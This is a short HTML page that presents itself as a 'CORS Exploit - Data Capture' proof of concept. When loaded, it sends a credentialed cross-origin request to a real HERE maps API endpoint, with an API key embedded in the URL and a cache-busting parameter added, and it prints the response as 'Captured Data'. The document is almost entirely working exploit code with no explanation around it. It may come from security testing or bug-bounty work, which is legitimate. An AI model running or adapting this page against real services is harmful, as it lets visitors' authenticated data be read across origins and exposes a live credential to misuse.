<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS Exploit - Data Capture</title>
    <style>
        body { font-family: Arial, sans-serif; }
        #response { white-space: pre-wrap; margin-top: 20px; }
    </style>
    <script>
        function fetchData() {
            var xhr = new XMLHttpRequest();
            var url = 'https://browse.search.hereapi.com/v1/browse?apiKey=sOp9lrUJDOgPABtkVdTXdoNSSe3iofUIjiWcKe-7Z1M&categories=car-dealer-repair&chains=322&at=52.520008%2C13.404954000000002&limit=50&lang=en-GB';

            // Add unique timestamp to bypass caching
            url += '&t=' + new Date().getTime();

            xhr.open('GET', url, true);
            xhr.withCredentials = true;

            xhr.onload = function() {
                if (xhr.status === 200) {
                    // Success: display the captured data
                    var responseData = xhr.responseText;
                    document.getElementById('response').textContent = 'Captured Data:\n' + responseData;
                } else {
                    // Error: log status and statusText
                    console.error('Request failed with status:', xhr.status, xhr.statusText);
                    document.getElementById('response').textContent = 'Error: ' + xhr.status + ' ' + xhr.statusText;
                }
            };

            xhr.onerror = function() {
                console.error('Network or CORS error occurred');
                document.getElementById('response').textContent = 'Network or CORS error occurred.';
            };

            console.log('Sending request to:', url); // Debugging: Log the request URL
            xhr.send();
        }

        // Fetch data on page load
        window.onload = fetchData;
    </script>
</head>
<body>
    <h1>CORS Exploit - Data Capture</h1>
    <div id="response">Waiting for data...</div>
</body>
</html>
